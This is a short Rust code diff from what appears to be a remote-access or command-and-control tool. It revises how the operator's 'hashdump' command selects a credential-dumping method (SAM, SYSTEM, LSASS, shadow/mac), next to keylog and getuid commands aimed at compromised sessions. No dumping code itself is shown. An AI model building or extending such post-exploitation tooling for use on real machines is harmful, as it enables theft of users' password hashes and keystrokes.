@@ -2203,8 +2203,15 @@ impl MatchEvent for App {
                                     Cmd::Keylog { session: sid.clone(), action }
                                 }
                                 Some("hashdump") => {
-                                    let method_str = parts.get(1).copied().unwrap_or("lsass");
-                                    let method = match method_str { "lsass" => 0, "shadow" => 1, _ => 0 };
+                                    // 统一语义：sam=0 system=1 lsass=2(deferred) shadow=3
+                                    let method_str = parts.get(1).copied().unwrap_or("sam");
+                                    let method = match method_str {
+                                        "sam" => 0,
+                                        "system" => 1,
+                                        "lsass" => 2,
+                                        "shadow" | "mac" => 3,
+                                        _ => 0,
+                                    };
                                     Cmd::Hashdump { session: sid.clone(), method }
                                 }
                                 Some("getuid") => Cmd::GetUid { session: sid.clone() },
